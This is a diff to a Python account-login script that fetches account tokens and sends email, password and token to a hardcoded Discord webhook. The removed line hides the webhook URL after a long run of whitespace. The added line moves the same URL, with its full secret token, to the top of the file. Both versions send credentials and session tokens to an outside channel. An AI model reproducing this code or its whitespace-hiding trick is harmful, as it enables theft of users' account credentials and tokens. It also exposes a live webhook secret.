@@ -16,7 +16,7 @@ from datetime import datetime
 from selenium.common.exceptions import TimeoutException
 from selenium.webdriver.common.proxy import Proxy, ProxyType
 import tls_client
-
+WEBHOOK_URL = "https://discord.com/api/webhooks/1322082195585765396/ykC3kVJVr7QIkipGf6dY23ch0JiecJcKeX3O5JW4M8TRYmRR5MDtyz8LwtHBlKhPfhfW"
 
 banner = f'''
              .+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+. 
@@ -126,7 +126,8 @@ def send_webhook(email, password, token):
         print(f"{timestamp()} {Fore.GREEN}✅ Token sent successfully via webhook.{Style.RESET_ALL}")
     else:
         print(f"{timestamp()} {Fore.RED}❌ Failed to send token via webhook. Response: {response.text}{Style.RESET_ALL}")
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                WEBHOOK_URL = "https://discord.com/api/webhooks/1322082195585765396/ykC3kVJVr7QIkipGf6dY23ch0JiecJcKeX3O5JW4M8TRYmRR5MDtyz8LwtHBlKhPfhfW"
+
+
 def login_and_fetch_token(email, password):
     data = {"email": email, "password": password, "undelete": "false"}
     headers = {
